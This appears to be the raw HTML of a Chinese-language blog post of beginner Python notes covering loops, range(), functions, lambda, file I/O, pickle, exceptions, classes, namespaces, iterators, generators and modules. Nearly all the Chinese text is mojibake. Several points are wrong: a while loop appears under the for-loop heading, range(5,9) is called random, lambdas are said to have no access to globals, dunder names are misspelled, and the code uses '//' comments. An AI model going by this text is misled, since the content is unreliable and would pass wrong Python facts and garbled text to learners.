href="#forå¾ªç¯">ğŸ­</a>forå¾ªç¯</h4><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> conditionï¼š   <span class="hljs-built_in">statements</span>â€¦â€¦</code></pre><ul><li>æ³¨æ„å†’å·å’Œç¼©è¿›</li><li>åœ¨ Python ä¸­æ²¡æœ‰ doâ€¦while å¾ªç¯</li></ul><h4 id="whileå¾ªç¯"><a class="header-anchor" href="#whileå¾ªç¯">ğŸ­</a>whileå¾ªç¯</h4><pre><code class="hljs dts">while <span class="hljs-params">&lt;expr&gt;</span>:    <span class="hljs-params">&lt;statement(s)&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;additional_statement(s)&gt;</span></code></pre><h4 id="forè¯­å¥"><a class="header-anchor" href="#forè¯­å¥">ğŸ­</a>forè¯­å¥</h4><pre><code class="hljs dts">for <span class="hljs-params">&lt;variable&gt;</span> in <span class="hljs-params">&lt;sequence&gt;</span>:    <span class="hljs-params">&lt;statements&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;statements&gt;</span></code></pre><p><strong>range()å‡½æ•°</strong></p><p>éå†æ•°å­—åºåˆ—,ç”Ÿæˆæ•°åˆ—</p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)//åœ¨(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)ä¹‹é—´éšæœº<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>)//ï¼ˆ<span class="hljs-number">0</span>ï¼Œ<span class="hljs-number">10</span>ï¼‰ä¹‹é—´ä»¥<span class="hljs-number">3</span>ä¸ºæ­¥é•¿<span class="hljs-attribute">list</span>(range(<span class="hljs-number">5</span>))//ç”¨range()åˆ›å»ºä¸€ä¸ªåˆ—è¡¨</code></pre><h4 id="pass"><a class="header-anchor" href="#pass">ğŸ­</a>pass</h4><p>ç©ºè¯­å¥ï¼Œä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚ï¼Œpass ä¸€èˆ¬ç”¨åšå ä½è¯­å¥ã€‚</p><h2 id="å‡½æ•°"><a class="header-anchor" href="#å‡½æ•°">ğŸ­</a>å‡½æ•°</h2><h4 id="è‡ªå®šä¹‰"><a class="header-anchor" href="#è‡ªå®šä¹‰">ğŸ­</a>è‡ªå®šä¹‰</h4><ul><li>å‡½æ•°ä»£ç å—ä»¥ <strong>def</strong> å¼€å¤´ï¼Œåæ¥å‡½æ•°æ ‡è¯†ç¬¦åç§°å’Œåœ†æ‹¬å· <strong>()</strong>ã€‚</li><li>ä»»ä½•ä¼ å…¥å‚æ•°å’Œè‡ªå˜é‡å¿…é¡»æ”¾åœ¨åœ†æ‹¬å·ä¸­é—´ï¼Œåœ†æ‹¬å·ä¹‹é—´å¯ä»¥ç”¨äºå®šä¹‰å‚æ•°ã€‚</li><li>å‡½æ•°çš„ç¬¬ä¸€è¡Œè¯­å¥å¯ä»¥é€‰æ‹©æ€§åœ°ä½¿ç”¨æ–‡æ¡£å­—ç¬¦ä¸²â€”ç”¨äºå­˜æ”¾å‡½æ•°è¯´æ˜</li><li>å‡½æ•°å†…å®¹ä»¥å†’å· : èµ·å§‹ï¼Œå¹¶ä¸”ç¼©è¿›ã€‚</li><li><strong>return [è¡¨è¾¾å¼]</strong> ç»“æŸå‡½æ•°ï¼Œé€‰æ‹©æ€§åœ°è¿”å›ä¸€ä¸ªå€¼ç»™è°ƒç”¨æ–¹ï¼Œä¸å¸¦è¡¨è¾¾å¼çš„ return ç›¸å½“äºè¿”å› Noneã€‚</li></ul><pre><code class="hljs flix"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">å‡½æ•°åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰</span></span>:    å‡½æ•°ä½“</code></pre><h4 id="å‚æ•°"><a class="header-anchor" href="#å‚æ•°">ğŸ­</a>å‚æ•°</h4><ul><li><p>å¿…éœ€å‚æ•°</p><p>ä»¥æ­£ç¡®çš„é¡ºåºä¼ å…¥å‡½æ•°ã€‚è°ƒç”¨æ—¶çš„æ•°é‡å¿…é¡»å’Œå£°æ˜æ—¶çš„ä¸€æ ·ã€‚</p></li><li><p>å…³é”®å­—å‚æ•°</p><p>å‡½æ•°è°ƒç”¨ä½¿ç”¨å…³é”®å­—å‚æ•°æ¥ç¡®å®šä¼ å…¥çš„å‚æ•°å€¼ã€‚ä½¿ç”¨å…³é”®å­—å‚æ•°å…è®¸å‡½æ•°è°ƒç”¨æ—¶å‚æ•°çš„é¡ºåºä¸å£°æ˜æ—¶ä¸ä¸€è‡´ã€‚</p></li><li><p>é»˜è®¤å‚æ•°</p></li><li><p>ä¸å®šé•¿å‚æ•°</p><p>å¤„ç†æ¯”å½“åˆå£°æ˜æ—¶æ›´å¤šçš„å‚æ•°ï¼Œå£°æ˜æ—¶ä¸å‘½å</p><p>åŠ äº†æ˜Ÿå· *çš„å‚æ•°ä¼šä»¥å…ƒç»„(tuple)çš„å½¢å¼å¯¼å…¥ï¼Œå­˜æ”¾æ‰€æœ‰æœªå‘½åçš„å˜é‡å‚æ•°ã€‚</p><p>å¸¦ä¸¤ä¸ªæ˜Ÿå· *çš„å‚æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼å¯¼å…¥ã€‚</p></li></ul><h4 id="åŒ¿åå‡½æ•°"><a class="header-anchor" href="#åŒ¿åå‡½æ•°">ğŸ­</a>åŒ¿åå‡½æ•°</h4><ul><li>python ä½¿ç”¨ lambda æ¥åˆ›å»ºåŒ¿åå‡½æ•°</li><li>lambda å‡½æ•°æ‹¥æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼Œä¸”ä¸èƒ½è®¿é—®è‡ªå·±å‚æ•°åˆ—è¡¨ä¹‹å¤–æˆ–å…¨å±€å‘½åç©ºé—´é‡Œçš„å‚æ•°</li><li>lambdaçš„ä¸»ä½“æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ä»…èƒ½åœ¨lambdaè¡¨è¾¾å¼ä¸­å°è£…æœ‰é™çš„é€»è¾‘è¿›å»ã€‚</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">lambda</span> <span class="hljs-selector-attr">[arg1 [,arg2,.....argn]</span>]<span class="hljs-selector-pseudo">:expression</span></code></pre><h2 id="è¾“å…¥ä¸è¾“å‡º"><a class="header-anchor" href="#è¾“å…¥ä¸è¾“å‡º">ğŸ­</a>è¾“å…¥ä¸è¾“å‡º</h2><blockquote><p>è¡¨è¾¾å¼è¯­å¥</p><p>print() å‡½æ•°</p><p>æ–‡ä»¶å¯¹è±¡çš„ write() æ–¹æ³•ï¼š</p><blockquote><p>æ ‡å‡†è¾“å‡ºï¼š <code>sys.stdout()</code></p><p>æ ¼å¼åŒ–è¾“å‡ºï¼š<code>str.format() </code></p><p>å­—ç¬¦ä¸²è¾“å‡ºï¼š</p><blockquote><p><strong>str()ï¼š</strong> å‡½æ•°è¿”å›ä¸€ä¸ªç”¨æˆ·æ˜“è¯»çš„è¡¨è¾¾å½¢å¼</p><p><strong>repr()ï¼š</strong> äº§ç”Ÿä¸€ä¸ªè§£é‡Šå™¨æ˜“è¯»çš„è¡¨è¾¾å½¢å¼</p><p><strong>rjust()</strong> : å°†å­—ç¬¦ä¸²é å³, å¹¶åœ¨å·¦è¾¹å¡«å……ç©ºæ ¼</p><p><strong>zfill()</strong>: åœ¨æ•°å­—çš„å·¦è¾¹å¡«å…… 0</p></blockquote></blockquote></blockquote><h2 id="è¯»å†™æ–‡ä»¶"><a class="header-anchor" href="#è¯»å†™æ–‡ä»¶">ğŸ­</a>è¯»å†™æ–‡ä»¶</h2><p>open() å°†ä¼šè¿”å›ä¸€ä¸ª file å¯¹è±¡:</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(filename, mode)</span></span></code></pre><p>modeå†³å®šäº†æ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ï¼šåªè¯»ï¼Œå†™å…¥ï¼Œè¿½åŠ </p><table><thead><tr><th>æ¨¡å¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>r</td><td>ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚</td></tr><tr><td>rb</td><td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td>r+</td><td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td>rb+</td><td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr></tbody></table><p>ä»¥ä¸Šæ¨¡å¼ç±»æ¨r,w,a.</p><h2 id="æ–‡ä»¶å¯¹è±¡æ–¹æ³•"><a class="header-anchor" href="#æ–‡ä»¶å¯¹è±¡æ–¹æ³•">ğŸ­</a>æ–‡ä»¶å¯¹è±¡æ–¹æ³•</h2><ul><li><p><code>f.read()</code>:è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹</p></li><li><p><code>f.readline()</code>:ä»æ–‡ä»¶ä¸­è¯»å–å•ç‹¬çš„ä¸€è¡Œ</p></li><li><p><code>f.readlines() </code>:å°†è¿”å›è¯¥æ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰è¡Œ</p></li><li><p><code>f.write(string)</code> :å°† string å†™å…¥åˆ°æ–‡ä»¶ä¸­, ç„¶åè¿”å›å†™å…¥çš„å­—ç¬¦æ•°</p></li><li><p><code>f.tell() </code>:è¿”å›æ–‡ä»¶å¯¹è±¡å½“å‰æ‰€å¤„çš„ä½ç½®(ä»æ–‡ä»¶å¼€å¤´å¼€å§‹ç®—èµ·çš„å­—èŠ‚æ•°)</p></li><li><p><code>file.close()</code>:å…³é—­æ–‡ä»¶ã€‚å…³é—­åæ–‡ä»¶ä¸èƒ½å†è¿›è¡Œè¯»å†™æ“ä½œ</p></li><li><p><code>file.flush()</code>ï¼šåˆ·æ–°æ–‡ä»¶å†…éƒ¨ç¼“å†²ï¼Œç›´æ¥æŠŠå†…éƒ¨ç¼“å†²åŒºçš„æ•°æ®ç«‹åˆ»å†™å…¥æ–‡ä»¶</p></li><li><p><code>f.seek(offset, from_what)</code>:æ”¹å˜æ–‡ä»¶å½“å‰çš„ä½ç½®</p><p><code>from_what </code>:0 è¡¨ç¤ºå¼€å¤´, 1 è¡¨ç¤ºå½“å‰ä½ç½®, 2 è¡¨ç¤ºæ–‡ä»¶çš„ç»“å°¾</p></li></ul><h2 id="pickle-æ¨¡å—"><a class="header-anchor" href="#pickle-æ¨¡å—">ğŸ­</a>pickle æ¨¡å—</h2><pre><code class="hljs css"><span class="hljs-selector-tag">pickle</span><span class="hljs-selector-class">.dump</span>(<span class="hljs-selector-tag">obj</span>, <span class="hljs-selector-tag">file</span>, <span class="hljs-selector-attr">[,protocol]</span>)</code></pre><ul><li>åºåˆ—åŒ–æ“ä½œ:å°†ç¨‹åºä¸­è¿è¡Œçš„å¯¹è±¡ä¿¡æ¯ä¿å­˜åˆ°æ–‡ä»¶ä¸­å»ï¼Œæ°¸ä¹…å­˜å‚¨ã€‚</li><li>ååºåˆ—åŒ–æ“ä½œ:ä»æ–‡ä»¶ä¸­åˆ›å»ºä¸Šä¸€æ¬¡ç¨‹åºä¿å­˜çš„å¯¹è±¡ã€‚</li></ul><p>OSæ¨¡å—è¯¦è§ï¼š<a href="https://www.runoob.com/python3/python3-os-file-methods.html">OS æ–‡ä»¶/ç›®å½•æ–¹æ³•</a></p><h2 id="æŠ¥é”™ä¿¡æ¯"><a class="header-anchor" href="#æŠ¥é”™ä¿¡æ¯">ğŸ­</a>æŠ¥é”™ä¿¡æ¯</h2><blockquote><p>è¯­æ³•é”™è¯¯</p><blockquote><p>Python æ— æ³•è§£æä»£ç </p></blockquote></blockquote><blockquote><p>å¼‚å¸¸</p><blockquote><p>è¿è¡ŒæœŸæ£€æµ‹åˆ°çš„é”™è¯¯</p><blockquote><p><strong>Try è¯­å¥:</strong></p><p>å¯ä½¿ç”¨ try è¯­å¥å¤„ç†å¼‚å¸¸</p><ul><li><p><code>try</code>ï¼šå¿…éœ€å­å¥,æ˜¯ Python åœ¨ <code>try</code> è¯­å¥ä¸­é¦–å…ˆè¿è¡Œçš„ä»£ç ã€‚</p></li><li><p><code>except</code>ï¼š</p></li></ul><p><em>ä¸€ä¸ª try è¯­å¥å¯èƒ½åŒ…å«å¤šä¸ªexceptå­å¥,ä½†æœ€å¤šåªæœ‰ä¸€ä¸ªåˆ†æ”¯ä¼šè¢«æ‰§è¡Œ</em></p><p><em>è¿è¡Œ <code>try</code> å—æ—¶é‡åˆ°å¼‚å¸¸ï¼Œå®ƒå°†è·³åˆ°å¤„ç†è¯¥å¼‚å¸¸çš„ <code>except</code> å—ã€‚</em></p><p><em>å¦‚æœä¸€ä¸ªå¼‚å¸¸æ²¡æœ‰ä¸ä»»ä½•çš„ except  åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸ªå¼‚å¸¸å°†ä¼šä¼ é€’ç»™ä¸Šå±‚çš„ try ä¸­</em></p><p><em>ä¸€ä¸ªexceptå­å¥å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªå¼‚å¸¸ï¼ˆï¼‰:</em></p><pre><code class="hljs python"><span class="hljs-keyword">except</span> (RuntimeError, TypeError, NameError):    <span class="hljs-keyword">pass</span></code></pre><ul><li><p><code>else</code>ï¼šåœ¨è¿è¡Œ <code>try</code> å—æ—¶æ²¡æœ‰é‡åˆ°å¼‚å¸¸æ‰§è¡Œ</p></li><li><p><code>finally</code>ï¼šæ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸éƒ½å°†æ‰§è¡Œæœ€åçš„ä»£ç </p></li></ul></blockquote></blockquote></blockquote><h4 id="æŠ›å‡ºå¼‚å¸¸"><a class="header-anchor" href="#æŠ›å‡ºå¼‚å¸¸">ğŸ­</a>æŠ›å‡ºå¼‚å¸¸</h4><p>ä½¿ç”¨ raise è¯­å¥æŠ›å‡ºä¸€ä¸ªæŒ‡å®šçš„å¼‚å¸¸ï¼š</p><pre><code class="hljs inform7">raise <span class="hljs-comment">[Exception <span class="hljs-comment">[, args <span class="hljs-comment">[, traceback]</span>]</span>]</span></code></pre><p>raiseçš„å‚æ•°æŒ‡å®šäº†è¦è¢«æŠ›å‡ºçš„å¼‚å¸¸ï¼šä¸€ä¸ªå¼‚å¸¸çš„å®ä¾‹æˆ–è€…æ˜¯å¼‚å¸¸çš„ç±»ï¼ˆä¹Ÿå°±æ˜¯ Exception çš„å­ç±»ï¼‰</p><h2 id="é¢å‘å¯¹è±¡"><a class="header-anchor" href="#é¢å‘å¯¹è±¡">ğŸ­</a>é¢å‘å¯¹è±¡</h2><ul><li><code>ç±»(Class)</code>: æè¿°å…·æœ‰ç›¸åŒçš„å±æ€§å’Œæ–¹æ³•çš„å¯¹è±¡çš„é›†åˆã€‚å®ƒå®šä¹‰äº†è¯¥é›†åˆä¸­æ¯ä¸ªå¯¹è±¡æ‰€å…±æœ‰çš„å±æ€§å’Œæ–¹æ³•ã€‚å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ã€‚</li><li><code>æ–¹æ³•</code>:ç±»ä¸­å®šä¹‰çš„å‡½æ•°ã€‚ï¼ˆä¸æ™®é€šçš„å‡½æ•°çš„åŒºåˆ«:å¿…é¡»æœ‰ä¸€ä¸ªé¢å¤–çš„ç¬¬ä¸€ä¸ªå‚æ•°åç§°:selfï¼‰</li><li><code>ç±»å˜é‡</code>:ç±»å˜é‡åœ¨æ•´ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡ä¸­æ˜¯å…¬ç”¨çš„ã€‚ç±»å˜é‡å®šä¹‰åœ¨ç±»ä¸­ä¸”åœ¨å‡½æ•°ä½“ä¹‹å¤–ã€‚ç±»å˜é‡é€šå¸¸ä¸ä½œä¸ºå®ä¾‹å˜é‡ä½¿ç”¨ã€‚</li><li><code>æ•°æ®æˆå‘˜</code>:ç±»å˜é‡æˆ–è€…å®ä¾‹å˜é‡ç”¨äºå¤„ç†ç±»åŠå…¶å®ä¾‹å¯¹è±¡çš„ç›¸å…³çš„æ•°æ®ã€‚</li><li><code>æ–¹æ³•é‡å†™</code>:å¦‚æœä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼Œè¿™ä¸ªè¿‡ç¨‹å«æ–¹æ³•çš„è¦†ç›–,ä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡å†™ã€‚</li><li><code>å±€éƒ¨å˜é‡</code>:å®šä¹‰åœ¨æ–¹æ³•ä¸­çš„å˜é‡ï¼Œåªä½œç”¨äºå½“å‰å®ä¾‹çš„ç±»ã€‚</li><li><code>å®ä¾‹å˜é‡</code>:åœ¨ç±»çš„å£°æ˜ä¸­ï¼Œå±æ€§æ˜¯ç”¨å˜é‡æ¥è¡¨ç¤ºçš„ï¼Œè¿™ç§å˜é‡å°±ç§°ä¸ºå®ä¾‹å˜é‡ï¼Œå®ä¾‹å˜é‡å°±æ˜¯ä¸€ä¸ªç”¨ self ä¿®é¥°çš„å˜é‡ã€‚</li><li><code>ç»§æ‰¿</code>:å³ä¸€ä¸ªæ´¾ç”Ÿç±»ï¼ˆderived classï¼‰ç»§æ‰¿åŸºç±»ï¼ˆbase  classï¼‰çš„å­—æ®µå’Œæ–¹æ³•ã€‚ç»§æ‰¿ä¹Ÿå…è®¸æŠŠä¸€ä¸ªæ´¾ç”Ÿç±»çš„å¯¹è±¡ä½œä¸ºä¸€ä¸ªåŸºç±»å¯¹è±¡å¯¹å¾…ã€‚</li><li><code>å®ä¾‹åŒ–</code>:åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œç±»çš„å…·ä½“å¯¹è±¡ã€‚</li><li><code>å¯¹è±¡</code>:é€šè¿‡ç±»å®šä¹‰çš„æ•°æ®ç»“æ„å®ä¾‹ã€‚å¯¹è±¡åŒ…æ‹¬ä¸¤ä¸ªæ•°æ®æˆå‘˜ï¼ˆç±»å˜é‡å’Œå®ä¾‹å˜é‡ï¼‰å’Œæ–¹æ³•ã€‚</li></ul><blockquote><p>ç±»çš„ç§æœ‰å±æ€§</p><blockquote><p><strong>__private_attrs</strong>ï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥å±æ€§ä¸ºç§æœ‰ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è¢«ä½¿ç”¨æˆ–ç›´æ¥è®¿é—®ã€‚åœ¨ç±»å†…éƒ¨çš„æ–¹æ³•ä¸­ä½¿ç”¨æ—¶ <strong>self.__private_attrs</strong></p></blockquote></blockquote><blockquote><p>ç±»çš„ç§æœ‰æ–¹æ³•</p><blockquote><p><strong>__private_method</strong>ï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥æ–¹æ³•ä¸ºç§æœ‰æ–¹æ³•ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨è°ƒç”¨ ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è°ƒç”¨ã€‚<strong>self.__private_methods</strong></p></blockquote></blockquote><p>ç±»çš„ä¸“æœ‰æ–¹æ³•</p><blockquote><p><code>__init__ </code>:æ„é€ å‡½æ•°ï¼Œåœ¨ç”Ÿæˆå¯¹è±¡æ—¶è°ƒç”¨<br><strong><code>__del__</code>:</strong> ææ„å‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶ä½¿ç”¨<br><strong><code>__repr__</code> :</strong> æ‰“å°ï¼Œè½¬æ¢<br><strong><code>__setitem__</code> :</strong> æŒ‰ç…§ç´¢å¼•èµ‹å€¼<br><strong><code>__getitem__</code>:</strong> æŒ‰ç…§ç´¢å¼•è·å–å€¼<br><strong><code>__len__</code>:</strong> è·å¾—é•¿åº¦<br><strong><code>__cmp__</code>:</strong> æ¯”è¾ƒè¿ç®—<br><strong><code>__call__</code>:</strong> å‡½æ•°è°ƒç”¨<br><strong><code>__add__</code>:</strong> åŠ è¿ç®—<br><strong><code>__sub__</code>:</strong> å‡è¿ç®—<br><strong><code>__mul__</code>:</strong> ä¹˜è¿ç®—<br><strong><code>__truediv__</code>:</strong> é™¤è¿ç®—<br><strong><code>__mod__</code>:</strong> æ±‚ä½™è¿ç®—<br><strong><code>__pow__</code>:</strong> ä¹˜æ–¹</p></blockquote><h2 id="å‘½åç©ºé—´"><a class="header-anchor" href="#å‘½åç©ºé—´">ğŸ­</a>å‘½åç©ºé—´</h2><p>å„ä¸ªå‘½åç©ºé—´ç‹¬ç«‹ï¼š</p><ul><li><strong>å†…ç½®åç§°ï¼ˆbuilt-in names</strong>ï¼‰ï¼Œå†…ç½®çš„åç§°ï¼Œå¦‚å‡½æ•°å absã€char å’Œå¼‚å¸¸åç§° BaseExceptionã€Exception â€¦â€¦</li><li><strong>å…¨å±€åç§°ï¼ˆglobal namesï¼‰</strong>ï¼Œæ¨¡å—ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†æ¨¡å—çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°ã€ç±»ã€å…¶å®ƒå¯¼å…¥çš„æ¨¡å—ã€æ¨¡å—çº§çš„å˜é‡å’Œå¸¸é‡ã€‚</li><li><strong>å±€éƒ¨åç§°ï¼ˆlocal namesï¼‰</strong>ï¼Œå‡½æ•°ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†å‡½æ•°çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°çš„å‚æ•°å’Œå±€éƒ¨å®šä¹‰çš„å˜é‡</li></ul><img src="/2021/02/18/python2/3.png" alt="3" style="zoom:67%;"><h2 id="ä½œç”¨åŸŸ"><a class="header-anchor" href="#ä½œç”¨åŸŸ">ğŸ­</a>ä½œç”¨åŸŸ</h2><p>ç¨‹åºå¯ä»¥ç›´æ¥è®¿é—®å‘½åç©ºé—´çš„æ­£æ–‡åŒºåŸŸ</p><img src="/2021/02/18/python2/4.png" alt="4" style="zoom:67%;"><p>åšå›¾ä¸Šç˜¾ingğŸ·ğŸ·ğŸ·</p><h2 id="è¿­ä»£å™¨"><a class="header-anchor" href="#è¿­ä»£å™¨">ğŸ­</a>è¿­ä»£å™¨</h2><ul><li>è®¿é—®é›†åˆå…ƒç´ çš„ä¸€ç§æ–¹å¼ã€‚</li><li>å®ƒå¯ä»¥è®°ä½éå†çš„ä½ç½®çš„å¯¹è±¡ã€‚</li><li>è¿­ä»£å™¨å¯¹è±¡ä»é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹è®¿é—®ï¼Œç›´åˆ°æ‰€æœ‰çš„å…ƒç´ è¢«è®¿é—®å®Œç»“æŸã€‚è¿­ä»£å™¨åªèƒ½å¾€å‰ä¸ä¼šåé€€ã€‚</li></ul><p>åŸºæœ¬çš„æ–¹æ³•ï¼š</p><blockquote><p><strong><code>__iter()__</code></strong></p><blockquote><p>è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„è¿­ä»£å™¨å¯¹è±¡ï¼Œ è¿™ä¸ªè¿­ä»£å™¨å¯¹è±¡å®ç°äº†<code>__next__()</code>æ–¹æ³•å¹¶é€šè¿‡ StopIteration å¼‚å¸¸æ ‡è¯†è¿­ä»£çš„å®Œæˆ</p></blockquote></blockquote><blockquote><p><strong><code>__next()__</code></strong></p><blockquote><p>è¿”å›ä¸‹ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡</p></blockquote></blockquote><h2 id="ç”Ÿæˆå™¨"><a class="header-anchor" href="#ç”Ÿæˆå™¨">ğŸ­</a>ç”Ÿæˆå™¨</h2><p>ä½¿ç”¨äº† yield çš„å‡½æ•°ã€‚</p><ul><li>ç”Ÿæˆå™¨æ˜¯ä¸€ä¸ªè¿”å›è¿­ä»£å™¨çš„å‡½æ•°ï¼Œåªèƒ½ç”¨äºè¿­ä»£æ“ä½œ</li><li>è°ƒç”¨ç”Ÿæˆå™¨æ—¶ï¼Œé‡åˆ° yield æ—¶å‡½æ•°ä¼šæš‚åœå¹¶ä¿å­˜å½“å‰æ‰€æœ‰çš„è¿è¡Œä¿¡æ¯ï¼Œè¿”å› yield çš„å€¼, å¹¶åœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œ next() æ–¹æ³•æ—¶ä»å½“å‰ä½ç½®ç»§ç»­è¿è¡Œã€‚</li></ul><h2 id="æ¨¡å—"><a class="header-anchor" href="#æ¨¡å—">ğŸ­</a>æ¨¡å—</h2><p>æŠŠè¿™äº›å®šä¹‰å­˜æ”¾åœ¨æ–‡ä»¶ä¸­ï¼Œä¸ºä¸€äº›è„šæœ¬æˆ–è€…äº¤äº’å¼çš„è§£é‡Šå™¨å®ä¾‹ä½¿ç”¨ï¼Œè¿™ä¸ªæ–‡ä»¶è¢«ç§°ä¸ºæ¨¡å—ï¼Œæ¨¡å—åŒ…å«æ‰€æœ‰å®šä¹‰çš„å‡½æ•°å’Œå˜é‡çš„æ–‡ä»¶ï¼Œä¸”å¯ä»¥è¢«åˆ«çš„ç¨‹åºå¼•å…¥ã€‚</p><h4 id="å¸¸ç”¨æ¨¡å—"><a class="header-anchor" href="#å¸¸ç”¨æ¨¡å—">ğŸ­</a>å¸¸ç”¨æ¨¡å—</h4><ul><li>csvï¼šè¯»å– csv æ–‡ä»¶</li><li>collectionsï¼šå¸¸è§æ•°æ®ç±»å‹çš„å®ç”¨æ‰©å±•ï¼ŒåŒ…æ‹¬ OrderedDictã€defaultdict å’Œ namedtuple</li><li>randomï¼šç”Ÿæˆå‡éšæœºæ•°å­—ï¼Œéšæœºæ‰“ä¹±åºåˆ—å¹¶é€‰æ‹©éšæœºé¡¹</li><li>stringï¼šå…³äºå­—ç¬¦ä¸²çš„æ›´å¤šå‡½æ•°ã€‚æ­¤æ¨¡å—è¿˜åŒ…æ‹¬å®ç”¨çš„å­—æ¯é›†åˆï¼Œä¾‹å¦‚ string.digitsï¼ˆåŒ…å«æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯æœ‰æ•ˆæ•°å­—çš„å­—ç¬¦ä¸²ï¼‰ã€‚</li><li>reï¼šé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åœ¨å­—ç¬¦ä¸²ä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…</li><li>mathï¼šä¸€äº›æ ‡å‡†æ•°å­¦å‡½æ•°</li><li>osï¼šä¸æ“ä½œç³»ç»Ÿäº¤äº’</li><li>os.pathï¼šos çš„å­æ¨¡å—ï¼Œç”¨äºæ“çºµè·¯å¾„åç§°</li><li>sysï¼šç›´æ¥ä½¿ç”¨ Python è§£é‡Šå™¨</li><li>jsonï¼šé€‚ç”¨äºè¯»å†™ json æ–‡ä»¶ï¼ˆé¢å‘ç½‘ç»œå¼€å‘ï¼‰</li></ul><h4 id="import-è¯­å¥"><a class="header-anchor" href="#import-è¯­å¥">ğŸ­</a>import è¯­å¥</h4><pre><code class="hljs ceylon"><span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span><span class="hljs-number">1</span>[, <span class="hljs-keyword">module</span><span class="hljs-number">2</span>[,... moduleN]<span class="hljs-keyword">import</span> A as B<span class="hljs-comment">//ç»™å¼•å…¥çš„åŒ…Aå®šä¹‰ä¸€ä¸ªåˆ«åB</span></code></pre><p>ä¸¾ä¸ªæ —å­ğŸ’ŒğŸ’ŒğŸ’Œï¼š</p><pre><code class="hljs stylus">import sys<span class="hljs-comment">// å¼•å…¥æ ‡å‡†åº“ä¸­çš„ sys.py æ¨¡å—</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> sys<span class="hljs-selector-class">.argv</span>:<span class="hljs-comment">//sys.argv æ˜¯ä¸€ä¸ªåŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„åˆ—è¡¨</span>   print(i) <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;\nPython è·¯å¾„ä¸ºï¼š&#x27;</span>, sys.path, <span class="hljs-string">&#x27;\n&#x27;</span>)</span></span><span class="hljs-comment">//æŸ¥æ‰¾æ‰€éœ€æ¨¡å—çš„è·¯å¾„çš„åˆ—è¡¨</span></code></pre><ul><li>ä¸€ä¸ªæ¨¡å—åªä¼šè¢«å¯¼å…¥ä¸€æ¬¡</li><li>æœç´¢è·¯å¾„æ˜¯ç”±ä¸€ç³»åˆ—ç›®å½•åç»„æˆçš„ï¼ŒPythonè§£é‡Šå™¨å°±ä¾æ¬¡ä»è¿™äº›ç›®å½•ä¸­å»å¯»æ‰¾æ‰€å¼•å…¥çš„æ¨¡å—</li></ul><h4 